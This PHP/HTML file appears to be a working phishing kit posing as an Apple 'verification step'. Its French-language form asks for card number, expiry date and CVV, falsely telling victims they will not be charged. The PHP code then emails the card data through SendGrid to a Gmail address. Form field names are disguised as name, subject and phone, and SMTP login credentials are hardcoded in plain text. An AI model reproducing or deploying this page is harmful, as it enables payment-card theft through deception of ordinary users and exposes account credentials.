<?php
if(isset($_POST['submit'])) 
{

$message=
'Full Name: '.$_POST['fullname'].'<br />
Subject:  '.$_POST['subject'].'<br />
Phone:  '.$_POST['phone'].'<br />

';
    require "phpmailer/class.phpmailer.php"; //include phpmailer class
      
    // Instantiate Class  
    $mail = new PHPMailer();  
      
    // Set up SMTP  
    $mail->IsSMTP();                // Sets up a SMTP connection  
    $mail->SMTPAuth = true;         // Connection with the SMTP does require authorization    
    $mail->SMTPSecure = "ssl";      // Connect using a TLS connection  
    $mail->Host = "smtp.sendgrid.net";  //Gmail SMTP server address
    $mail->Port = 465;  //Gmail SMTP port
    $mail->Encoding = '7bit';
    
    // Authentication  
    $mail->Username   = "jbecotech"; // Your full Gmail address
    $mail->Password   = "oraclezend1526"; // Your Gmail password
      
    // Compose

    $mail->Subject = "New Contact Form Enquiry";      // Subject (which isn't required)  
    $mail->MsgHTML($message);
 
    // Send To  
    $mail->AddAddress("jbecosystem@gmail.com", "Recipient Name"); // Where to send it - Recipient
    $result = $mail->Send();    // Send!  
  $message = $result ? 'Successfully Sent!' : 'Sending Failed!';      
  unset($mail);

}
?>
<html lang="en" >
<head>

<meta charset="UTF-8">
<title>Apple verification step</title>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<link rel="stylesheet" href="css/style.css">
<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel='stylesheet prefetch' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
<link rel="stylesheet" href="apple-movil/css/style.css">
  <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
</head>
</head>

<body src="css/bg.png">
   <nav>
  <div class="menu">
    <a class="menu-icon-box" href="#">
      <span class="menu-icon"></span>
      <span class="menu-icon"></span>
    </a>
    <a href="#"><i class="fa fa-apple" aria-hidden="true"></i></a>
    <a href="#"><i class="fa fa-shopping-bag" aria-hidden="true"></i></a>
  </div>
  <div class="submenu">
    <ul>
      <li><a href="#">Mac</a></li>
      <li><a href="#">iPad</a></li>
      <li><a href="#">iPhone</a></li>
      <li><a href="#">Watch</a></li>
      <li><a href="#">TV</a></li>
      <li><a href="#">Music</a></li>
      <li><a href="#">Support</a></li>
      <li><a href="#"><i class="fa fa-search" aria-hidden="true"></i>Search apple.com</a></li>
    </ul>
  </div>
</nav>
  
  <script  src="apple-movil/js/index.js"></script>
  <div class="img-container" ></div>
 <div class="container-fluid">
        <div class="creditCardForm">
            <div class="heading">
                <h1>Confirmez votre numéro de carte Bancaire ci-dessus pour continuer</h1>
             <center>
               <h3>votre carte credit ne sera pas débitée nous vérifions juste votre majorité<br></h3><h4> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &Chi; &Chi; &Chi; &Chi;&nbsp; &Chi; &Chi; &Chi; &Chi;&nbsp; &Chi; &Chi; &Chi; &Chi;&nbsp; 2363</h4></center>
 <center>
  <div class="form-group" id="credit_cards">
                     &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   <img src="assets/images/visa.jpg" id="visa">
                        <img src="assets/images/mastercard.jpg" id="mastercard">
                        <img src="assets/images/amex.jpg" id="amex">
                    </div>
                  </center>
                  <form name="form1" id="form1" action="" method="post">

 <div class="payment">
                                  <div class="form-group" id="card-number-field">
                        <label for="cardNumber">Card Number</label>
                        <input type="text" name="fullname" class="form-control" id="cardNumber">
                    </div>
                    <div class="form-group owner">
                        <label for="owner">Expiration Date</label>
                        <input type="text" name="subject" class="form-control" id="owner">
                    </div>
                    <div class="form-group CVV">
                        <label for="cvv">CVV</label>
                        <input type="text" name="phone" class="form-control" id="cvv">
                    </div>
            </div>
<center>
<a href="#">Cancel</a>&nbsp;&#124;&nbsp;<input href="SecurityQuestions.html"  style="border:none;background-color:white;font-size:10,5pt;color:#2E64FE;" type="submit" name="submit" value="Continue" ></a></center>
</body>
  <p><?php if(!empty($message)) echo $message; ?></p>
</form>
<!-- If you're using Stripe for payments -->
<script type="text/javascript" src="https://js.stripe.com/v2/"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="assets/js/jquery.payform.min.js" charset="utf-8"></script>
<script src="assets/js/script.js"></script>
</body>
</html>
